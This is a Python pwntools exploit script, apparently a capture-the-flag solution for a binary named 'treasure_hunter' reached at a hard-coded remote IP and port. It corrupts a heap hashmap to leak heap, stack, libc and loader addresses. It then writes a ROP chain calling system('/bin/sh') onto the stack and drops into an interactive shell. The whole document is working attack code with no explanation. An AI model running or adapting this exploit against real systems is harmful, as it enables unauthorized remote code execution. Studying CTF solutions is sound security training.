from pwn import *
import subprocess
import hashlib

# context.log_level = 'debug'

elf = ELF("./treasure_hunter")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# io = process(['./treasure_hunter'])
io = remote('1.95.4.251', 31778)
# io = remote('127.0.0.1', 31778)

if __name__ == '__main__':
    io.recvuntil(b'Drawing...\n')

    # get all safe places
    safe_place = []
    for i in range(0x1C):
        io.recvuntil(b'place ')
        idx = int(io.recvuntil(b': ', drop=True).decode())
        is_safe = io.recvuntil(b'\n', drop=True)
        if is_safe == b'safe':
            safe_place.append(idx)
    print(safe_place)

    # extract gold coins that is available
    for idx in safe_place:
        io.recvuntil(b'Today, where are we going, captain?\n')
        io.sendline(str(idx).encode())
        io.recvuntil(b'we discovered ')
        coin = int(io.recvuntil(b' ', drop=True).decode())
        io.sendafter(b'(b for bury and g for get)\n', b'g')
        io.sendlineafter(b'How many to get?\n', str(coin).encode())
        io.sendlineafter(b'Content length: ', b'256')
        io.sendlineafter(b'Content: ', b'AAA')
        io.recvline()
        io.send(b'n')
        l = io.recvline().decode()
        if not l.startswith("Do you get"):
            io.sendafter(b'Do you get what you want, captain?(y to end exploration)\n', b'n')

    io.recvuntil(b'Today, where are we going, captain?\n')
    io.sendline(str(safe_place[-1]).encode())
    io.sendafter(b'(b for bury and g for get)\n', b'b')
    io.sendlineafter(b'How many to bury?\n', b'1')
    io.sendlineafter(b'Content length: ', str(0x100).encode())
    io.sendlineafter(b'Content: ', b'AAA')
    io.sendafter(b'Buy?(y for yes)\n', b'y')
    io.recvuntil(b'flag: 0x')
    hashmap_addr = int(io.recvuntil(b'\033', drop=True), 16)
    print(hex(hashmap_addr))  # get hashmap address (heap address, we can get other chunks by offsets)
    io.sendlineafter(b'write: \033[0m', b'1234567')
    io.sendafter(b'Do you get what you want, captain?(y to end exploration)\n', b'n')

    io.recvuntil(b'Today, where are we going, captain?\n')
    io.sendline(str(safe_place[-1]).encode())
    io.sendafter(b'(b for bury and g for get)\n', b'b')
    io.sendlineafter(b'How many to bury?\n', b'1')
    io.sendlineafter(b'Content length: ', str(0x408).encode())

    fake_content = cyclic(0x10)
    fake_content += packing.p64(hashmap_addr - 0x3E0)
    fake_content += packing.p64(hashmap_addr - 0x1E0)
    fake_content += packing.p64(hashmap_addr - 0x1E0)
    fake_content += b'AAAAAAAA'
    addr_set = []
    addr_map = {}
    for i in range(8):
        stack_addr_off = 0x2AC0 + i  # want to get stack address
        stack_addr_hash = int.from_bytes(hashlib.sha256(packing.p64(stack_addr_off)).digest(),
                                         byteorder="little") & 0xFFFF_FFFF_FFFF_FFFF
        print(hashlib.sha256(packing.p64(stack_addr_off)).hexdigest(), hex(stack_addr_hash))
        stack_addr_group = (stack_addr_hash >> 4) & 0x1
        stack_addr_ctr = stack_addr_hash >> 57
        addr_set.append([stack_addr_off, stack_addr_group, stack_addr_ctr, stack_addr_hash])
    for i in range(8):
        malloc_addr_off = 0x2A60 + i  # want to get libc address
        malloc_addr_hash = int.from_bytes(hashlib.sha256(packing.p64(malloc_addr_off)).digest(),
                                          byteorder="little") & 0xFFFF_FFFF_FFFF_FFFF
        print(hashlib.sha256(packing.p64(malloc_addr_off)).hexdigest())
        malloc_addr_group = (malloc_addr_hash >> 4) & 0x1
        malloc_addr_ctr = malloc_addr_hash >> 57
        addr_set.append([malloc_addr_off, malloc_addr_group, malloc_addr_ctr, malloc_addr_hash])
    for i in range(8):
        ld_addr_off = 0x1AA0 + i  # want to get stack address
        ld_addr_hash = int.from_bytes(hashlib.sha256(packing.p64(ld_addr_off)).digest(),
                                      byteorder="little") & 0xFFFF_FFFF_FFFF_FFFF
        print(hashlib.sha256(packing.p64(ld_addr_off)).hexdigest(), hex(ld_addr_hash))
        ld_addr_group = (ld_addr_hash >> 4) & 0x1
        ld_addr_ctr = ld_addr_hash >> 57
        addr_set.append([ld_addr_off, ld_addr_group, ld_addr_ctr, ld_addr_hash])
    fake_vector_data = b''
    for i in range(2):
        fake_vector_one_group = b''
        inner_idx = 0
        for s in addr_set:
            if s[1] == i:
                fake_vector_one_group += packing.p64(s[0]) + packing.p64(1)
                addr_map[inner_idx + i * 16] = s
                inner_idx += 1
        fake_vector_one_group = fake_vector_one_group.ljust(16 * 16, b'\x00')
        fake_vector_data += fake_vector_one_group
    fake_content += fake_vector_data
    fake_content = fake_content.ljust(0x408, b'\x00')
    fake_content += packing.p64(0x21)
    fake_content += packing.p16((hashmap_addr - 0x400) & 0xFFFF)

    io.sendafter(b'Content: ', fake_content)
    io.sendafter(b'Buy?(y for yes)\n', b'y')

    iter_list = sorted(list(addr_map.items()), key=lambda y: y[0])
    first_p = 0
    first_v = iter_list[0][1][2]

    io.sendlineafter(b'write: \033[0m', str(first_p).encode())
    io.sendafter(b'Write: \n', packing.p8(first_v))
    io.sendafter(b'Do you get what you want, captain?(y to end exploration)\n', b'n')

    # next, change the control bytes
    for i in iter_list:
        print(i)
    for i in range(len(iter_list)):
        p, v = iter_list[i]
        io.recvuntil(b'Today, where are we going, captain?\n')
        io.sendline(str(v[0]).encode())
        io.recvline()
        x = io.recvline()
        if x.startswith(b'Congratulations'):
            value = int(x[31:].split(b' ')[0].decode(), 10)
        else:
            value = 0
        iter_list[i][1].append(value)
        io.sendafter(b'(b for bury and g for get)\n', b'a')
        io.sendlineafter(b'Content length: ', str(0x100).encode())
        io.sendlineafter(b'Content: ', b'AAA')
        if i != len(iter_list) - 1:
            io.sendafter(b'Buy?(y for yes)\n', b'y')
            io.sendlineafter(b'write: \033[0m', str(iter_list[i + 1][0]).encode())
            io.sendafter(b'Write: \n', packing.p8(iter_list[i + 1][1][2]))
        else:
            io.sendafter(b'Buy?(y for yes)\n', b'n')
        io.sendafter(b'Do you get what you want, captain?(y to end exploration)\n', b'n')

    iter_list = sorted(iter_list, key=lambda x: x[1][0])
    malloc_addr = 0
    stack_addr = 0
    mmap_addr = 0
    for i in range(8):
        mmap_addr += iter_list[i][1][4] << (i * 8)
    for i in range(8):
        malloc_addr += iter_list[i + 8][1][4] << (i * 8)
    for i in range(8):
        stack_addr += iter_list[i + 16][1][4] << (i * 8)
    ld_offset = 0x4F80
    mmap_addr -= ld_offset
    print("malloc address: " + hex(malloc_addr))
    print("stack address: " + hex(stack_addr))
    print("mmap address: " + hex(mmap_addr))
    libc_base = malloc_addr - libc.symbols['malloc']
    print("libc base: " + hex(libc_base))
    system = libc_base + libc.symbols['system']
    poprdirbp_ret = libc_base + 0x2a745
    poprdi_ret = libc_base + 0x2a3e5
    binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
    main_ret_addr = stack_addr - 0x110

    # start writing short ROP chain: pop rdi(->address of string "/bin/sh"); ret(to system)
    io.recvuntil(b'Today, where are we going, captain?\n')
    io.sendline(str(0x2A60).encode())
    io.sendafter(b'(b for bury and g for get)\n', b'a')
    io.sendlineafter(b'Content length: ', str(0x408).encode())

    write_stack_offset = main_ret_addr - mmap_addr
    print("offset needed to write to stack: " + hex(write_stack_offset))

    fake_content = cyclic(0x10)
    fake_content += packing.p64(hashmap_addr - 0x3E0)
    fake_content += packing.p64(hashmap_addr - 0x1E0)
    fake_content += packing.p64(hashmap_addr - 0x1E0)
    fake_content += b'AAAAAAAA'
    exp_addr_set = []
    for i in range(16):
        exp_addr_off = write_stack_offset + i  # want to get stack address
        exp_addr_hash = int.from_bytes(hashlib.sha256(packing.p64(exp_addr_off)).digest(),
                                       byteorder="little") & 0xFFFF_FFFF_FFFF_FFFF
        exp_addr_group = (exp_addr_hash >> 4) & 0x1
        exp_addr_ctr = exp_addr_hash >> 57
        exp_addr_set.append([exp_addr_off, exp_addr_group, exp_addr_ctr, exp_addr_hash])
    for i in range(8):
        exp_addr_off = write_stack_offset + i + 24
        exp_addr_hash = int.from_bytes(hashlib.sha256(packing.p64(exp_addr_off)).digest(),
                                       byteorder="little") & 0xFFFF_FFFF_FFFF_FFFF
        exp_addr_group = (exp_addr_hash >> 4) & 0x1
        exp_addr_ctr = exp_addr_hash >> 57
        exp_addr_set.append([exp_addr_off, exp_addr_group, exp_addr_ctr, exp_addr_hash])
    exp_addr_map = {}
    fake_vector_data = b''
    for i in range(2):
        fake_vector_one_group = b''
        inner_idx = 0
        for s in exp_addr_set:
            if s[1] == i:
                fake_vector_one_group += packing.p64(s[0]) + packing.p64(1)
                exp_addr_map[inner_idx + i * 16] = s
                inner_idx += 1
        fake_vector_one_group = fake_vector_one_group.ljust(16 * 16, b'\x00')
        fake_vector_data += fake_vector_one_group
    fake_content += fake_vector_data
    fake_content = fake_content.ljust(0x408, b'\x00')
    fake_content += packing.p64(0x21)
    fake_content += packing.p16((hashmap_addr - 0x400) & 0xFFFF)

    io.sendafter(b'Content: ', fake_content)
    io.sendafter(b'Buy?(y for yes)\n', b'y')

    target_value = packing.p64(poprdirbp_ret) + packing.p64(binsh_addr) + packing.p64(0) + packing.p64(system)
    iter_list = sorted(list(exp_addr_map.items()), key=lambda y: y[0])
    for i in iter_list:
        print(i)
    first_p = 0
    first_v = iter_list[0][1][2]

    io.sendlineafter(b'write: \033[0m', str(first_p).encode())
    io.sendafter(b'Write: \n', packing.p8(first_v))
    io.sendafter(b'Do you get what you want, captain?(y to end exploration)\n', b'n')

    # next, change the control bytes and change stack bytes
    for i in range(len(iter_list)):
        p, v = iter_list[i]
        print(p, v)
        io.recvuntil(b'Today, where are we going, captain?\n')
        io.sendline(str(v[0]).encode())
        io.recvline()
        x = io.recvline()
        if x.startswith(b'Congratulations'):
            value = int(x[31:].split(b' ')[0].decode(), 10)
        else:
            value = 0
        target = target_value[v[0] - write_stack_offset]
        if target > value:
            io.sendafter(b'(b for bury and g for get)\n', b'b')
            io.sendlineafter(b'How many to bury?\n', str(target - value).encode())
        elif value > target:
            io.sendafter(b'(b for bury and g for get)\n', b'g')
            io.sendlineafter(b'How many to get?\n', str(value - target).encode())
        else:
            io.sendafter(b'(b for bury and g for get)\n', b'a')
        io.sendlineafter(b'Content length: ', str(0x100).encode())
        io.sendlineafter(b'Content: ', b'AAA')
        if i != len(iter_list) - 1:
            io.sendafter(b'Buy?(y for yes)\n', b'y')
            io.sendlineafter(b'write: \033[0m', str(iter_list[i + 1][0]).encode())
            io.sendafter(b'Write: \n', packing.p8(iter_list[i + 1][1][2]))
            io.sendafter(b'Do you get what you want, captain?(y to end exploration)\n', b'n')
        else:
            io.sendafter(b'Buy?(y for yes)\n', b'n')
            # io.interactive()
            io.sendafter(b'Do you get what you want, captain?(y to end exploration)\n', b'y')

    io.interactive()
